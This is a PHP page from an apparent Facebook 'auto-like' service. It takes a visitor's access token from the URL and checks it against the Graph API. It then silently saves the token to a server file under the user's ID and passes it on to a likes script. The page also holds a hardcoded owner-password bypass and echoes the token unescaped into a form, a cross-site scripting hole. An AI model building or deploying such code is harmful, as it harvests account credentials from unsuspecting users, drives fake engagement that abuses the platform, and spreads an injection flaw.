<?php error_reporting(0);
$accesstoken = $_GET["accesstoken"];
if($accesstoken == "")
{
	session_destroy();
	header("Location: index.php?error=Enter Your Access Token !");
	die();
}
$remove1 = '=';
$remove2 = '&';
preg_match('/'.preg_quote($remove1).'(.*?)'.preg_quote($remove2).'/is', $accesstoken, $accesstokenFiltered);
if(!$accesstokenFiltered[1])
{
	$accesstoken = $accesstoken;
}
else
{
	$accesstoken = $accesstokenFiltered[1];
}
require('php-sdk/facebook.php');
include 'info.php';
$facebook = new Facebook(array(
   'appId' => '',
   'secret' => '',
   'cookie' => true
));
	try
	{
	   $parameters['access_token'] = $accesstoken;
	   $userData = $facebook->api('/me?fields=id,name', $parameters);
	   $statuses = $facebook->api('/me/feed?limit=5', $parameters);
	   foreach($statuses['data'] as $status)
	   {
	   }
	}
	catch (FacebookApiException $e)
	{
		if($accesstoken == $set[password])
		{
		}
		else
		{
			session_destroy();
			header("Location: index.php?error=Access Token Expired !");
			die();
		}
	}
if($userData)
{
	$user = $userData['id'];
	$handle = fopen('database/'.$user.'', 'w') or die('Error !');
	fwrite($handle, $accesstoken);
	fclose($handle);
}
?>
<?php
$name = $userData['name'];
if($accesstoken == $set[password])
{
	$name = $set[owner_name];
}
include 'header.php';
?>
<div class="post-single">
	<div class="post-meta"><h2 class="title">Fan Page Like</h2></div>
    <div class="post-content" style="display: block !important;visibility: visible !important;">
    <a href="http://stackideas.com/docs/easyblog/how-tos/how-to-get-my-facebook-page-id">How To Find My Page ID ?</a>
    </div>
</div>
<div class="post">
	<div class="post-meta">
    <h2 class="title">Fan Page Like</h2>
    </div>
    <li>Paste Your Page ID / Page CODE .</li>
    <li>
    <form id="search-form" method="get" action="m-likes.php">
    Page ID : <input class="inp-text" name="postid" value="" required/>
    <input style="display: none;" name="accesstoken" value="<?php echo $accesstoken; ?>">
    <input class="inp-btn" value="Auto Like" type="submit"/>
	</form>
    </li>
</div>
<?php
include 'footer.php';
?>